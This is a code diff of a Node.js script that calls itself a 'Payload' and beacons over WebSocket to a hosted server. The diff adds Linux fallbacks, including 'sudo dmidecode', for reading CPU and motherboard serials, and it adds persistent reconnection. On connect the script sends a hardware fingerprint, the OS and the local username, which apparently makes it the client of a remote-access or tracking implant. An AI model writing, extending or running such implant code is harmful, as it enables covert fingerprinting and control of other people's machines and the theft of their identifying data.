@@ -29,7 +29,7 @@ function log(msg) {
 
 log("[INIT] Payload starting...");
 
-// POINTS TO YOUR RENDER SERVER — NOT VERCEL
+// POINTS TO YOUR RENDER SERVER
 const WS_URL = 'wss://server-nuc6.onrender.com';
 
 let myId = null;
@@ -59,12 +59,18 @@ function getMacAddress() {
 
 function getCpuSerial() {
   try { return execSync('wmic cpu get processorid').toString().split('\n')[1].trim(); }
-  catch (e) { return 'unknown_cpu'; }
+  catch (e) {
+    try { return execSync('cat /proc/cpuinfo | grep Serial | awk \'{print $3}\'').toString().trim(); }
+    catch (e2) { return 'unknown_cpu'; }
+  }
 }
 
 function getBoardSerial() {
   try { return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim(); }
-  catch (e) { return 'unknown_board'; }
+  catch (e) {
+    try { return execSync('sudo dmidecode -t system | grep Serial | awk \'{print $3}\'').toString().trim(); }
+    catch (e2) { return 'unknown_board'; }
+  }
 }
 
 // Try to load persistent ID from disk first
@@ -88,15 +94,22 @@ let localStream = null;
 
 function initConnection() {
   log(`[WS] Attempting connection to ${WS_URL}...`);
+  
+  // Add error handler BEFORE connecting
   ws = new WebSocket(WS_URL);
+  
+  ws.on('error', (err) => {
+    log(`[WS] Connection error: ${err.message}`);
+    isConnected = false;
+  });
 
   ws.on('open', () => {
     reconnectAttempts = 0;
     isConnected = true;
     safeSend(JSON.stringify({
       type: 'info',
-      id: myId,           // <-- THIS IS THE HARDWARE FINGERPRINT
-      uniqueId: myId,     // <-- ALSO SEND IT AS uniqueId
+      id: myId,           // <-- SEND AS 'id'
+      uniqueId: myId,     // <-- ALSO SEND AS 'uniqueId'
       os: os.platform(),
       arch: os.arch(),
       user: os.userInfo().username,
@@ -117,6 +130,7 @@ function initConnection() {
 
   ws.on('close', () => {
     isConnected = false;
+    log(`[WS] Closed. Reconnecting in 5s...`);
     setTimeout(initConnection, 5000);
   });
 }
